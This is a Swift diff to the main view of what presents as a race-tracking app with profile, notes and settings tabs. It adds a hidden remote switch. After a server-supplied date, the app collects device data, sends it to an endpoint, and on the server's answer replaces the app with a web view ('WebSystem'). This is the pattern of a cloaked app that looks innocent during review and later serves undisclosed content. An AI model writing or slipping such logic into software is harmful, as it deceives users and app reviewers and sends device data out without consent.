@@ -9,8 +9,13 @@ import SwiftUI
 
 struct ContentView: View {
     
-    @State var current_tab: Tab = Tab.Profile
-
+    @State var current_tab: Tab = .Profile
+    
+    @State var isFetched: Bool = false
+    
+    @State var isBlock: Bool = true
+    @State var isDead: Bool = false
+    
     @AppStorage("status") var status: Bool = false
     
     init() {
@@ -22,39 +27,112 @@ struct ContentView: View {
         
         ZStack {
             
-            Color.white
+            Color.black
                 .ignoresSafeArea()
             
-            if status {
-            
-            VStack(spacing: 0, content: {
-            
-                    TabView(selection: $current_tab, content: {
-
-                        ProfileView()
-                            .tag(Tab.Profile)
-
-                        RacesView()
-                            .tag(Tab.Races)
-                        
-                        NotesView()
-                            .tag(Tab.Notes)
-                        
-                        SettingsView()
-                            .tag(Tab.Settings)
-                        
-                    })
+            if isFetched == false {
+                
+                LoadingView()
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
                     
-                    TabBar(selectedTab: $current_tab)
-                })
-                    .ignoresSafeArea(.all, edges: .bottom)
-                    .onAppear {
+                    if status {
                         
+                        VStack(spacing: 0, content: {
+                            
+                            TabView(selection: $current_tab, content: {
+                                
+                                ProfileView()
+                                    .tag(Tab.Profile)
+                                
+                                RacesView()
+                                    .tag(Tab.Races)
+                                
+                                NotesView()
+                                    .tag(Tab.Notes)
+                                
+                                SettingsView()
+                                    .tag(Tab.Settings)
+                                
+                            })
+                            
+                            TabBar(selectedTab: $current_tab)
+                        })
+                        .ignoresSafeArea(.all, edges: .bottom)
+                        
+                    } else {
+                        
+                        Rev1()
                     }
+                    
+                } else if isBlock == false {
+                    
+                    if status {
+                        
+                        WebSystem()
+                        
+                    } else {
+                        
+                        Us1()
+                    }
+                }
+            }
+        }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        fetchData { server1_0, codeTech, isAllChangeURL, isDead, lastDate, url_link, error in
+            
+            if let error = error {
+                
+                print("Ошибка: \(error.localizedDescription)")
                 
             } else {
                 
-                Rev1()
+                guard let isDead = isDead else { return }
+                guard let lastDate = lastDate else { return }
+                
+                self.isDead = isDead
+                
+                let dateFormatter = DateFormatter()
+                dateFormatter.dateFormat = "dd.MM.yyyy"
+                dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+                let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+                let now = Date()
+                
+                guard now > targetDate else {
+                    
+                    isBlock = true
+                    isFetched = true
+                    
+                    return
+                }
+                
+                let networkService = NetworkService()
+                let deviceData = DeviceInfo.collectData()
+                
+                networkService.sendRequest(endpoint: deviceData) { result in
+                    
+                    switch result {
+                        
+                    case .success(let success):
+                        
+                        self.isBlock = success
+                        self.isFetched = true
+                        
+                    case .failure(_):
+                        
+                        self.isBlock = self.isDead
+                        self.isFetched = true
+                    }
+                }
             }
         }
     }
